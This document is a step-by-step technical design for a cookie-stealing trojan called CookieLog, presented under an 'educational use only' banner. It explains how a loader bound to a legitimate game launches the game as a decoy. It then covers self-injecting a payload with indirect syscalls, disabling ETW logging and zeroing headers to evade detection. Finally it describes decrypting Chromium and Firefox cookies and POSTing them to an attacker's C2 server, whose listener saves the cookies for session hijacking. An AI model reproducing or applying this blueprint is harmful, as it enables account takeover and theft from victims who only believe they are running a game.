===============================================================================
  COOKIELOG -- PAYLOAD EXECUTION FLOW (STEP BY STEP)
===============================================================================

  EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
  Only use on systems you own or are explicitly authorized to test.
  Unauthorized use is illegal. The authors are not responsible for misuse.

This document describes exactly what happens when a victim runs an infected
.exe, from double-click to cookie exfiltration.

-------------------------------------------------------------------------------
INFECTED .EXE FILE FORMAT
-------------------------------------------------------------------------------

  [loader.exe bytes] [host.exe bytes] [host_len:4 bytes LE] [magic:4 bytes "CKLG"]

  - loader.exe     = the self-injecting loader (compiled from loader.cpp)
                     Contains the payload DLL embedded as g_payload[] byte array
                     (generated by gen.ps1 from ckdll.dll)
  - host.exe       = the original game/application the attacker chose to infect
  - host_len       = 32-bit little-endian length of host.exe
  - magic "CKLG"   = 4-byte trailer to identify infected files

  The C2 URL is embedded inside loader.exe via sentinel patching:
  - ckdll.cpp declares: static char g_c2_url[256] = "CKC2_DEADBEEF_";
  - pick.py finds this 14-byte sentinel in loader.exe and overwrites 256 bytes
    with the attacker's URL (e.g. "http://192.168.1.5:9090/", null-padded)
  - If the sentinel is intact (not patched), the payload falls back to local
    exfiltration (named pipe or drop.json file)

-------------------------------------------------------------------------------
STEP 1: VICTIM DOUBLE-CLICKS THE INFECTED .EXE
-------------------------------------------------------------------------------

  loader.cpp: wmain() runs with no console window (GUI subsystem).

  1a. loader.exe reads its own file to find the "CKLG" magic at the tail.
  1b. Reads host_len (4 bytes before the magic).
  1c. Reads host_len bytes of the original host .exe from the file.
  1d. VirtualAlloc + ReadFile -> hbuf[] contains the clean original .exe.

-------------------------------------------------------------------------------
STEP 2: RENAME-RESTORE (preserves original exe name for Unity games)
-------------------------------------------------------------------------------

  Unity games derive their data directory from the exe name:
  "MyGame.exe" looks for "MyGame_Data/". If extracted as "~ck_tmp.exe",
  Unity looks for "~ck_tmp_Data/" and crashes.

  2a. MoveFileExW(origName, "~ck_bak.bin", REPLACE_EXISTING)
      -> renames the infected .exe to a hidden backup file
  2b. CreateFileW(origName, GENERIC_WRITE, CREATE_ALWAYS)
      -> creates a new file with the ORIGINAL name
  2c. WriteFile(horig, hbuf, host_len)
      -> writes the clean original host bytes to the original filename
  2d. Now the original .exe name exists on disk with clean content.

  Fallback (if rename fails, e.g. AV blocking):
  2e. Write host bytes to "~ck_tmp.exe" (hidden) instead.

-------------------------------------------------------------------------------
STEP 3: LAUNCH THE ORIGINAL HOST (game/installer opens normally)
-------------------------------------------------------------------------------

  3a. CreateProcessW(runExe, ..., wdir=game_dir, SW_SHOWNORMAL)
      -> The original game/application launches and appears on screen.
      -> Working directory = directory of the infected .exe (so relative paths
         like "MyGame_Data/" and "UnityPlayer.dll" resolve correctly).
  3b. CloseHandle on host process/thread (we don't wait for it).

  At this point the victim sees the game/app running normally.
  No visible indication of anything wrong.

-------------------------------------------------------------------------------
STEP 4: SELF-INJECTION (payload mapping)
-------------------------------------------------------------------------------

  4a. InitSyscalls(): reads the SSNs of NtAllocateVirtualMemory,
      NtProtectVirtualMemory and NtCreateThreadEx from the mapped ntdll stubs
      (4C 8B D1 B8 ss ss ss ss), finds a "syscall; ret" (0F 05 C3) gadget in
      ntdll's .text, and builds three stubs in one RX page:
      mov r10,rcx; mov eax,ssn; mov r11,gadget; jmp r11
      Fallback if any step fails: the kernel32 exports (the run continues).

  4b. NtAllocateVirtualMemory(indirect, NtCurrentProcess) at the payload's
      preferred base 0x5F000000 (MEM_RESERVE|MEM_COMMIT, RW).
      If the range is taken, retry anywhere and apply the .reloc directory.

  4c. Copy the PE headers and every section from g_payload[] into this process.

  4d. Resolve the IAT in-process: for each imported DLL (kernel32, advapi32,
      crypt32, bcrypt, iphlpapi, secur32), LoadLibraryA + GetProcAddress and
      write the address into the mapped thunk. All are signed System32 images.

  4e. RtlAddFunctionTable: register the payload's .pdata range so an exception
      inside the manually mapped image can unwind.

  4f. Patch EtwEventWrite to 33 C0 C3 (xor eax,eax; ret): event writes report
      success without emitting.

  4g. Release only: SetProcessMitigationPolicy(ProcessSignaturePolicy =
      MicrosoftSignedOnly). The payload is already mapped; any later image load
      must be Microsoft-signed.

  4h. Seal the image: per-section protections (RX/RW, no global RWX), zero the
      DOS/NT headers (no MZ/PE at 0x5F000000), zero the staging buffer.

  4i. NtCreateThreadEx(indirect) at payload_entry with arg=1.
      Fallback: CreateThread. The loader waits for that thread and exits.
      There is no host process to resume or terminate.

-------------------------------------------------------------------------------
STEP 5: PAYLOAD EXECUTION (ckdll.cpp: payload_entry)
-------------------------------------------------------------------------------

  payload_entry() runs in the loader process.

  5a. Check: reason==1 (LoadLibrary) or h==1 (thread arg).
      If neither, return (not the right attach mode).
  5b. LoadLibraryA("winsqlite3.dll") -> resolve SQLite exports via GetProcAddress:
      sqlite3_open_v2, sqlite3_prepare16_v2, sqlite3_step, sqlite3_column_int,
      sqlite3_column_int64, sqlite3_column_blob, sqlite3_column_bytes,
      sqlite3_finalize, sqlite3_close
  5c. Preload dependency DLLs (a manually mapped image has none loaded):
      LoadLibraryA("crypt32.dll")   -> for CryptUnprotectData (DPAPI)
      LoadLibraryA("bcrypt.dll")    -> for BCrypt* (AES-256-GCM)
      LoadLibraryA("ws2_32.dll")    -> for Winsock2 (HTTP exfiltration)
  5d. GetEnvironmentVariableW("LOCALAPPDATA") and ("APPDATA")
      -> locates browser profile directories.

-------------------------------------------------------------------------------
STEP 6: CHROMIUM COOKIE EXTRACTION (DumpChromium)
-------------------------------------------------------------------------------

  For each browser in [chrome, edge, brave, vivaldi, opera]:

  6a. Build path: %LOCALAPPDATA%\<browser>\User Data (or %APPDATA% fallback)
  6b. LoadLocalState(root):
      - Read "Local State" JSON file
      - Find "os_crypt" section
      - Extract "encrypted_key" (v10/v11): base64-decode, strip "DPAPI" prefix,
        CryptUnprotectData (user DPAPI) -> 32-byte AES key
      - Extract "app_bound_encrypted_key" (v20): read pre-extracted key from
        C:\ProgramData\MediaCache\mc.key (if available)
  6c. Enumerate profile directories (Default, Profile 1, Profile 2, ...)
  6d. For each profile, find cookie database:
      - Chrome >=88: <profile>\Network\Cookies
      - Chrome <88:  <profile>\Cookies
  6e. CopyDb(): CopyFileW(cookie_db, %TEMP%\ck_db.tmp)
      -> bypasses browser file locks (browsers hold exclusive locks on live DBs)
      -> also copies -wal and -shm companion files
      -> if browser is running and holds an exclusive lock, CopyFileW fails
         gracefully (that profile is skipped)
  6f. sqlite3_open_v2(tmp_db, SQLITE_OPEN_READONLY)
  6g. sqlite3_prepare16_v2: SELECT host_key, name, path, encrypted_value,
      expires_utc, is_secure, is_httponly, samesite FROM cookies;
  6h. For each row (sqlite3_step == SQLITE_ROW):
      - Build Cookie-Editor JSON object:
        {
          "domain": host_key,
          "name": name,
          "path": path,
          "value": <decrypted>,       (see step 6i)
          "expirationDate": <unix epoch>,  (converted from Windows FILETIME)
          "sameSite": "None"|"Strict"|"Lax",  (Chromium: 2=None, 1=Strict, 0=Lax)
          "secure": true|false,
          "httpOnly": true|false,
          "hostOnly": true|false,      (true if domain doesn't start with ".")
          "session": true|false        (true if expirationDate == 0)
        }
  6i. DecCookie(encrypted_value):
      - Check prefix: "v10"/"v11" (DPAPI key) or "v20" (app-bound key)
      - Format: [3-byte prefix][12-byte nonce][ciphertext][16-byte GCM tag]
      - AesGcm(key, nonce, ciphertext, tag) via BCryptDecrypt
      - v20: strip 32-byte SHA256 domain hash prefix from plaintext
      - Result: decrypted cookie value (plaintext string)

-------------------------------------------------------------------------------
STEP 7: FIREFOX COOKIE EXTRACTION (DumpFirefox)
-------------------------------------------------------------------------------

  7a. Build path: %APPDATA%\Mozilla\Firefox\Profiles\*
  7b. Enumerate profile directories (e.g. "qts8ovgj.default-esr")
  7c. For each profile:
      - Find cookies.sqlite
      - CopyDb() to %TEMP%\ck_db.tmp (bypass file lock)
      - sqlite3_open_v2 + prepare: SELECT name, value, host, path, expiry,
        isSecure, isHttpOnly, sameSite FROM moz_cookies;
  7d. For each row, build Cookie-Editor JSON:
      - Firefox cookies are PLAINTEXT (no encryption needed)
      - sameSite mapping is DIFFERENT from Chromium:
        Firefox: 0=None, 1=Lax, 2=Strict (Chromium: 0=Lax, 1=Strict, 2=None)
      - Same Cookie-Editor fields as Chromium

-------------------------------------------------------------------------------
STEP 8: HTTP EXFILTRATION (Sink + ExfilHTTP)
-------------------------------------------------------------------------------

  8a. Sink() closes the JSON array: g_out = "[{...},{...},...]"
  8b. Check if C2 URL is configured (sentinel was patched by pick.py):
      if g_c2_url[0..3] != "CKC2" -> C2 is configured
  8c. ExfilHTTP(g_c2_url):
      - Parse URL: http://HOST[:PORT][/PATH]
      - LoadLibraryA("ws2_32.dll"), resolve:
        WSAStartup, socket, connect, send, recv, closesocket, WSACleanup, inet_addr
      - WSAStartup(0x0202)
      - socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
      - inet_addr(host) -> resolve IP
      - connect(sock, sockaddr_in{host, port})
      - Build HTTP request:
        POST <path> HTTP/1.1\r\n
        Host: <host>\r\n
        Content-Type: application/json\r\n
        Content-Length: <g_len>\r\n
        Connection: close\r\n
        \r\n
      - send(header)
      - send(body) in 32KB chunks (g_out, g_len bytes total)
      - recv(response) -- discarded
      - closesocket + WSACleanup
      - Return true if all bytes sent

  Why Winsock2 and not WinHTTP:
    WinHTTP/WinINet require reading the Windows proxy configuration, which is
    unavailable in a manually mapped payload (error 12029 / ERROR_WINHTTP_CANNOT_CONNECT).
    Raw Winsock2 (socket+connect+send) has no such dependency and works in any
    process context.

  8d. If HTTP fails, fall through to fallbacks:
      - Named pipe \\.\pipe\ck_pipe (20 retries x 250ms, for sink.py)
      - Local file: C:\ProgramData\MediaCache\cache.json

-------------------------------------------------------------------------------
STEP 9: ATTACKER RECEIVES COOKIES (listen.py)
-------------------------------------------------------------------------------

  9a. listen.py runs an HTTP server (HTTPServerV4, forced IPv4) on the
      attacker's machine, listening on the configured port (default 9090).
  9b. On POST received:
      - Parse JSON body (Cookie-Editor format array)
      - Merge with existing collection (dedup by domain+name+path)
      - Write loot/cookies.json (Cookie-Editor JSON, indent=1)
      - Write loot/cookies.txt (Netscape format, for curl/wget)
      - Print summary: count, session cookies, top 15 domains
  9c. Attacker imports loot/cookies.json into their browser:
      - Install Cookie-Editor extension (Chrome/Firefox)
      - Click extension icon -> Import -> paste JSON contents
      - Cookies are now active in the attacker's browser

-------------------------------------------------------------------------------
TIMING
-------------------------------------------------------------------------------

  Step 1-3 (extract + launch host):     ~0.5 seconds
  Step 4 (self map + syscalls):         <0.1 seconds (no process creation)
  Step 5-7 (cookie extraction):         ~2-5 seconds
  Step 8 (HTTP exfiltration):            ~1-3 seconds (depends on cookie count)
  Total:                                 ~4-9 seconds

  The loader waits for the payload thread with no cap by default; -t N caps
  the wait, after which the loader exits and the payload dies with it.

-------------------------------------------------------------------------------
DEBUG MODE
-------------------------------------------------------------------------------

  Build with /DDEBUG to enable logging to C:\ProgramData\MediaCache\cache.log.
  Production builds (default in build.bat) define no DEBUG and leave no trace file.
  Each step (Sqlite load, profile enumeration, cookie count, HTTP status) is
  logged. Production build (without /DDEBUG) has no debug output and no
  debug.log file is created.

  To enable: build.bat with /DDEBUG in the cl command line.
  To disable: remove /DDEBUG from build.bat.
